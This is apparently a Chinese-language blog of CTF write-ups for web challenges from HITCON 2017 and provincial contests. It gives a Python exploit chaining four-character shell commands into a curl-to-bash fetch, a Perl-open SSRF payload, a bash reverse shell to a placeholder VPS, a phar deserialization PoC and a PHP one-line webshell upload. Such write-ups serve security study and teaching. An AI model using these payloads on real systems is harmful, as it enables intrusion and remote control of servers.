<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br></pre></td></tr></table></figure>
<p>那么x中就是<code>ls -th&gt;g</code>了 其他的差不多了
自己的exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">&#x27;&gt;dir&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;sl&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;g\&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;ht-&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*v&gt;x&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&gt;sh&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;ba\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\\\&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;<span class="number">14</span>\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;<span class="number">67</span>\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &quot;&gt;:\\&quot;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;cn\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;p.\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;e\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;he\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;cs\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;la\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;b\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;\ \\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;rl\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;cu\\<span class="string">&#x27;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">target=&#x27;</span><span class="number">117.50</span><span class="number">.3</span><span class="number">.97</span>:<span class="number">8002</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">payload.append(&#x27;</span>sh x<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">payload.append(&#x27;</span>sh g<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r = requests.get(&#x27;</span>http://<span class="string">&#x27; + target + &#x27;</span>/?reset=<span class="number">1</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">for i in payload:</span></span><br><span class="line"><span class="string">    assert len(i) &lt;= 4 </span></span><br><span class="line"><span class="string">    r = requests.get(&#x27;</span>http://<span class="string">&#x27; + target + &#x27;</span>/?cmd=<span class="string">&#x27; + quote(i) )</span></span><br><span class="line"><span class="string">    print i</span></span><br><span class="line"><span class="string">    sleep(0.5)</span></span><br></pre></td></tr></table></figure>
<p>同样拿到shell,同样的方法拿到flag</p>
<h3 id="ssrfme">ssrfme</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]); </span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>); </span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>])); </span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]); </span><br><span class="line">    <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>])); </span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>); </span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>); </span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>); </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
<p>这里有个<code>GET</code>命令,使用了一下,发现是发送请求的命令,那么显然存在一个ssrf.
进一步分析,发现可以在sandbox中写入任意文件,但是思索一番还是找不到getshell的方法
看了wp之后,发现是GET这个命令的问题 <img
src="/images/2018/08/ichunqiu-6.jpg" alt="blacsheep" />
追根溯源,发现其实是perl的open的任意命令执行的问题 举个例子 <img
src="/images/2018/08/ichunqiu-7.jpg" alt="blacsheep" />
而GET中有调用到open函数,也就导致了命令执行
不过要注意,ssrf请求文件的时候文件必须存在,不过这里很好解决,因为可以创建任意文件
最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://117.50.3.97:8004/?url=your_ip:port&amp;filename=abc&#x27;</span><br><span class="line">curl &#x27;http://117.50.3.97:8004/?url=&amp;filename=bash%20abc&#x27;</span><br><span class="line">curl &#x27;http://117.50.3.97:8004/?url=file:bash%20abc&amp;filename=xxx&#x27;</span><br></pre></td></tr></table></figure>
<p>其中服务器上面放放反弹shell的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/your_vps/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>然后nc收到shell,根目录找到flag <img
src="/images/2018/08/ichunqiu-8.jpg" alt="blacsheep" /></p>
<h3 id="babyh-master-php-2017">baby^h-master-php-2017</h3>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$FLAG</span>    = <span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/read_flag`);&#x27;</span>);</span><br><span class="line">    <span class="variable">$SECRET</span>  = `/read_secret`;</span><br><span class="line">    <span class="variable">$SANDBOX</span> = <span class="string">&quot;/var/www/data/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]); </span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$SANDBOX</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$SANDBOX</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$SANDBOX</span>));</span><br><span class="line">        <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&quot;sha1&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>);</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;session-data&quot;</span>, <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%s-----%s&quot;</span>, <span class="variable">$data</span>, <span class="variable">$hmac</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$avatar</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;avatar = <span class="variable">$path</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$random</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="number">32</span>));</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;function my_function_<span class="subst">$random</span>() &#123;&quot;</span></span><br><span class="line">                .<span class="string">&quot;  global \$FLAG; \$FLAG();&quot;</span></span><br><span class="line">                .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            <span class="variable">$_GET</span>[<span class="string">&quot;lucky&quot;</span>]();</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_session</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$SECRET</span>;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>];</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;-----&quot;</span>, <span class="variable">$data</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>)  !<span class="title function_ invoke__">is_string</span>(<span class="variable">$data</span>)  !<span class="title function_ invoke__">is_string</span>(<span class="variable">$hmac</span>))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="title function_ invoke__">hash_equals</span>(<span class="title function_ invoke__">hash_hmac</span>(<span class="string">&quot;sha1&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>), <span class="variable">$hmac</span>) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye&quot;</span>);</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;avatar) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye Bye&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>-&gt;avatar;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>] . <span class="string">&quot;/avatar.gif&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">&quot;GIF89a&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Fuck off&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span> . <span class="string">&quot;/avatar.gif&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Upload OK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span> . <span class="string">&quot;/avatar.gif&quot;</span>) )</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/gif&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span> . <span class="string">&quot;/avatar.gif&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$mode</span> = <span class="variable">$_GET</span>[<span class="string">&quot;m&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$mode</span> == <span class="string">&quot;upload&quot;</span>)</span><br><span class="line">        <span class="title function_ invoke__">upload</span>(<span class="title function_ invoke__">check_session</span>());</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$mode</span> == <span class="string">&quot;show&quot;</span>)</span><br><span class="line">        <span class="title function_ invoke__">show</span>(<span class="title function_ invoke__">check_session</span>());</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>分析一下代码,发现是个反序列化的题,仔细分析一下,首先发现<code>check_session()</code>中有个反序列化,不过前面有两个判断,即对data进行密钥hash然后判断,如果不同则直接<code>die</code>,然而我们并不知道secret,所以这里的反序列化并没有用
那么攻击点是什么呢?这里是orange的一个0day</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php在解析phar对象的时候会反序列化metadata</span><br></pre></td></tr></table></figure>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$argv</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;phar://./deser.phar&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hui</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;PWN\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;deser.phar&#x27;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/deser.phar&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$p</span>[<span class="string">&#x27;file.txt&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="keyword">new</span> <span class="title class_">Hui</span>());</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Could not create and/or modify phar:&#x27;</span>, <span class="variable">$e</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意提前把php.ini里面的phar的readonly改成off,不然会创建失败
底层代码<a
target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/238916b5c9b7d09a711aad5656710eb4d1a80518/ext/phar/phar.c#L609"
title="https://github.com/php/php-src/blob/238916b5c9b7d09a711aad5656710eb4d1a80518/ext/phar/phar.c#L609">https://github.com/php/php-src/blob/238916b5c9b7d09a711aad5656710eb4d1a80518/ext/phar/phar.c#L609</a>
<img src="/images/2018/08/ichunqiu-9.jpg" alt="blacsheep" />
当用<code>phar://</code>协议读取文件的时候,文件内容会被解析成<code>phar对象</code>,然后phar对象中的metadata反序列化,也就能构造一个我们想要的类了
给一个p师傅的poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$avatar</span> = <span class="string">&#x27;orz&#x27;</span>;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.phar&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;file.php&#x27;</span>] = <span class="string">&#x27;&lt;?php ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="keyword">new</span> <span class="title class_">Admin</span>());</span><br><span class="line"><span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.phar&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.gif&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造出反序列化的admin对象之后,新的问题是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$FLAG</span>    = <span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/read_flag`);&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>这里<code>create_function</code>没有函数名称,所以被设置成了<code>\x00lambda_%d</code>这里的%d每次+=1
不过这里%d会一直增大到最大长度直到结束,我们可以通过大量请求让pre-fork模式启动从而创建新的线程,这样%d就被刷新为1了,那么就成功预测了
整个攻击过程
首先运行脚本生成一个avatar文件,其中的metadata设置成要反序列化的类,生成一个avatar.gif,放到服务器上,然后upload上去
<img src="/images/2018/08/ichunqiu-10.jpg" alt="blacsheep" />
然后测试一下phpinfo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.50.3.97:8005/?m=upload&amp;url=phar:///var/www/data/bc571eef5a23ff081aa7adc9b5f43d08&amp;lucky=phpinfo</span><br></pre></td></tr></table></figure>
<p>得到结果 <img src="/images/2018/08/ichunqiu-11.jpg"
alt="blacsheep" />
那么函数设置成<code>%00lambda_1</code>然后开多线程请求 <img
src="/images/2018/08/ichunqiu-12.jpg" alt="blacsheep" /> 拿到flag</p>
<h2
id="第三届百越杯福建省高校网络空间安全大赛">第三届“百越杯”福建省高校网络空间安全大赛</h2>
<h3 id="do-you-know-upload">Do you know upload？</h3>
<p>进去发现是个上传页面,尝试hitcon的avatar.gif发现上传成功,然而里面有php的代码,于是改成一句话,burp抓包改后缀上传发现上传成功
<img src="/images/2018/08/ichunqiu-13.jpg" alt="blacsheep" />
发现居然还有个包含漏洞,不过无所谓了,查看一下2.php,发现成功解析,就直接getshell了
进去发现config.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;ctfctfctf&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;ctf&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>连接数据库,发现flag <img src="/images/2018/08/ichunqiu-14.jpg"
alt="blacsheep" /></p>
<h2 id="第二届广东省强网杯线上赛">2017第二届广东省强网杯线上赛</h2>
<h3 id="broken">broken</h3>
<p>进去发现jsfuck页面,复制解密,发现错误,check一下,发现少了一个<code>]</code>,添加上再解密,发现还是报错,类型错误,并不是函数,那么去掉最后的两个括号,再解密,得到结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;var flag=&quot;flag&#123;f_f_l_u_a_c_g_k&#125;&quot;;alert(&#x27;flag is not here&#x27;);&quot;]</span><br></pre></td></tr></table></figure>
<p>即拿到flag</p>
<h3 id="who-are-you">who are you</h3>
<p>进去发现no permissions 看下cookie,发现<code>Zjo1OiJ0aHJmZyI7</code>
base解一下,发现是<code>f:5:"thrfg";</code>
然后thrfg是guest的rot13,那么把admin的rot13传进去然后base一下进去发现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]; <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]; --&gt;Hello admin, now you can upload something you are easy to forget.&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>那么</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=1.php&amp;data=&lt;?php system($_GET[&#x27;a&#x27;])?&gt;</span><br></pre></td></tr></table></figure>
<p>然后访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://106.75.72.168:2222/uploads/1.php</span><br></pre></td></tr></table></figure>
<p>拿到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e07cd440-8eed-11e7-997d-7efc09eb6c59&#125;</span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#i%E6%98%A5%E7%A7%8B%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%98%A5%E7%A7%8B%E6%AC%A2%E4%B9%90%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">i春秋第二届春秋欢乐赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-world"><span class="toc-number">1.1.</span> <span class="toc-text">Hello World</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9C%8B%E4%BA%86%E5%88%AB%E4%BA%BA%E7%9A%84%E8%A7%A3%E6%B3%95"><span class="toc-number">1.1.1.</span> <span class="toc-text">看了别人的解法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hitcon2017"><span class="toc-number">2.</span> <span class="toc-text">HITCON2017</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babyfirst-revenge"><span class="toc-number">2.1.</span> <span class="toc-text">babyfirst-revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#infosec%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.1.</span> <span class="toc-text">infosec的方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyfirst-revenge-v2"><span class="toc-number">2.2.</span> <span class="toc-text">babyfirst-revenge-v2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrfme"><span class="toc-number">2.3.</span> <span class="toc-text">ssrfme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyh-master-php-2017"><span class="toc-number">2.4.</span> <span class="toc-text">baby^h-master-php-2017</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 